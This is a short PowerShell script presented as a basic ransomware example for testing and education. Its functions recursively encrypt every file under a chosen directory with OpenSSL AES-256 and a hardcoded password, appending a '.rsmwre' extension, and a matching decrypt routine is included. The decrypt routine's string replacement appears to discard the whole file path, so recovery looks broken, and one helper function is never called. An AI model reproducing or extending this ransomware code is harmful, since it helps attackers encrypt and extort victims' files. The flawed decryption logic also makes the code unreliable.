<#
Code written by A13Xg
Property of Alexander Goodman
A13Xg Industries
#>

## ABOUT
# This utility is designed to provide an example of a very basic RansomWare threat.
# This is provided strictly for the sake of testing and educational purposes ONLY.

    #// Example Encrypt Function
# openssl enc -aes-256-cbc -in un_encrypted.data -out encrypted.data
    #// Example Decrpyt Function
# openssl enc -d -aes-256-cbc -in encrypted.data -out un_encrypted.data

function GetFileScope {
    [CmdletBinding()]
    param (
       [STRING] $Directory = 'C:\'
    )
   $fileScope = (Get-ChildItem -Path $Directory -File -Recurse).FullName
}

function Encrypt {
    [CmdletBinding()]
    param (
       [STRING] $Pswd = '1234',
       [STRING] $Directory
    )
    $fileScope = (Get-ChildItem -Path "$Directory" -File -Recurse).FullName
    ForEach ($inFile in $fileScope) {
        Write-Host "Encrypting $inFile ..."
        $outFile = $inFile + '.rsmwre'
        .\OpenSSL.exe enc -k $Pswd -aes-256-cbc -e -in $inFile -out $outFile
        Write-Host "Done."
    }
}
function Decrypt {
    [CmdletBinding()]
    param (
       [STRING] $Pswd = '1234',
       [STRING] $Directory
    )
    $fileScope = (Get-ChildItem -Path "$Directory*.rsmwre" -File -Recurse).FullName
    ForEach ($inFile in $fileScope) {
        Write-Host "Decrypting $inFile ..."
        $outFile = $inFile -replace ".*.rsmwre"
        .\OpenSSL.exe enc -k $Pswd -aes-256-cbc -d -in $inFile -out $outFile
        Write-Host "Done."
    }
}

function RsmWre {
    param (
        [STRING] $Action
    )
    IF ($Action -eq "Encrypt") {
        Encrypt -Directory $Directory
    }
    ELSEIF ($Action -eq "Decrypt") {
        Decrypt -Directory $Directory
    }
    ELSE {
        Write-Error -Message "You did not supply a proper value for function RsmWre"
    }
}
$Action = Read-Host -Prompt "Enter action type"
$global:Directory = Read-Host -Prompt "Enter directory"

RsmWre -Action $Action